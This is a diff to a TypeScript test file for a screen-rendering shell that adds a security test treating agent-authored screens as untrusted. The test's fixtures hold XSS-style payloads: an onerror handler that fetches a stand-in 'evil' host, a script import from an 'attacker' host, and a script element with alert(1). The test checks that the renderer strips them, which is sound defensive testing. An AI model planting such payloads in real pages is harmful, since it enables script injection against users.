@@ -78,7 +78,7 @@ describe('renderScreenInShell', () => {
         const [baseUrl, route, consumedRoute, actionId, initiatorId, , serverSideType, componentState, parameters] = runAction.mock.calls[0]
         expect({ baseUrl, route, consumedRoute, actionId, initiatorId, serverSideType, componentState, parameters })
             .toEqual({ baseUrl: '/app', route: '/bookings', consumedRoute: '', actionId: '__preview__', initiatorId: 'content',
-                serverSideType: undefined, componentState: {}, parameters: { _yaml: 'type: Text\ntext: hi' } })
+                serverSideType: undefined, componentState: {}, parameters: { _yaml: 'type: Text\ntext: hi', _untrusted: true } })
         expect(ux.shown).toEqual([fragment])
     })
 
@@ -134,6 +134,23 @@ describe('renderScreenInShell', () => {
         const lonely = document.createElement('div')
         document.body.innerHTML = ''
         await expect(renderScreenInShell(lonely, { yaml: 'type: Text', target: 'content' })).rejects.toThrow(/no content area/)
+    })
+
+    it('an agent-authored screen is UNTRUSTED: nothing in it can run script, whichever path renders it', async () => {
+        const { ux, page, chat } = shell()
+        page.remove()
+        const evil = { type: 'ClientSide', id: 'gen', children: [], metadata: { type: 'Element', name: 'img',
+            attributes: { src: 'x', onerror: "fetch('https://evil/')", import: 'https://attacker/x.js' }, on: {}, content: '<b>hi</b>', html: true } }
+        runAction.mockResolvedValue({ fragments: [{ ...fragment, component: evil }] })
+        await renderScreenInShell(chat, { yaml: 'type: Element', target: 'content' })
+        const served = (ux.shown[0] as { component: { metadata: Record<string, unknown> } }).component.metadata
+        expect(served).toMatchObject({ name: 'img', attributes: { src: 'x' }, html: false })
+        expect(JSON.stringify(served)).not.toMatch(/onerror|attacker/)
+        // the static-bundle / offline path expands JSON in the browser: the same rules apply
+        runAction.mockRejectedValue(new Error('down'))
+        await renderScreenInShell(chat, { yaml: JSON.stringify({ type: 'Element', name: 'script', content: 'alert(1)' }), target: 'content' })
+        expect(JSON.stringify(ux.shown[1])).not.toContain('alert(1)')
+        expect(JSON.stringify(ux.shown[1])).not.toContain('"script"')
     })
 
     it('an overlay without a title is the generated screen', () => {
